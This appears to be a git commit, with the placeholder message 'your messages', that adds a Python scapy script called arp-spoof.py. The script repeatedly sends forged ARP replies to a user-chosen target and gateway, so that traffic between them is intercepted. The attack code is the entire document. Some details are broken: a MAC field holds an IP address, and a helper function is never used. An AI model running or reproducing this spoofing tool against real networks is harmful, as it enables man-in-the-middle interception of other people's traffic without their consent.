cbed681e66dfab2900606f18ef599782cf827cdf
prince <prince@locco.prince>
2020-04-05 19:55:38 -0500

    your messages

---
+++ arp-spoof.py
@@ -0,0 +1,39 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+import time
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    print(answered_list[0][1].hwsrc)
+    clients_list = []
+    for element in answered_list:
+        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        clients_list.append(client_dict)
+    return clients_list
+
+def spoof(target_ip, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="192.168.1.4", psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+target_ip = input("enter target ip : ")
+gateway_ip = input("enter target ip: ")
+
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Packets Sent: " + str(sent_packets_count), end= "")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("[+] Quitting")
+
+
+
+
